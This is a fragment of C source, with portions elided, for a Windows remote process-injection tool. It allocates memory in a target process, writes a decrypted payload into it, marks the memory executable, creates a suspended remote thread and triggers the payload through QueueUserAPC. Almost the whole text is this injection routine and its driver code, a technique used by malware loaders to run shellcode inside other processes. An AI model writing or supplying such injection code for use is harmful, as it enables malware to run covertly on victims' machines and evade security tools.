...
BOOL APCInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;
    ...
    printf("[i] Allocated Memory at: 0xlp \n", pAddress);
    printf("[i] Writing Memory to: 0xlp \n", pAddress);
    if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, NULL)) {
        printf("\t[!] WriteProcessMemory Failed With Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Changing Memory Permissions to PAGE_EXECUTE_READ");
    ...
    hRemoteThread = CreateRemoteThreadEx(hProcess, NULL, 0, NULL, NULL, CREATE_SUSPENDED, NULL, &dwThreadId);
    if (hRemoteThread == NULL) {
        printf("\t[!] CreateRemoteThreadEx Failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("\n[i] Created Suspended Thread With Id : %lu \n", dwThreadId);

    printf("[#] Press <Enter> To Run QueueAPC... \n");
    getchar();
    if (!QueueUserAPC((PAPCFUNC)pAddress, hRemoteThread, NULL)) {
...
int main() {
    ...
    if (!APCInject(hProcess, pPlainText, sPlainTextSize)) {
        printf("\n\t[!] Remote QueueAPC Failed!!");
    }

    HeapFree(GetProcessHeap(), 0, pPlainText);
    CloseHandle(hProcess);
    wprintf(L"[+] Remote QueueAPC completed successfully for %ls\n", TargetProcessName);
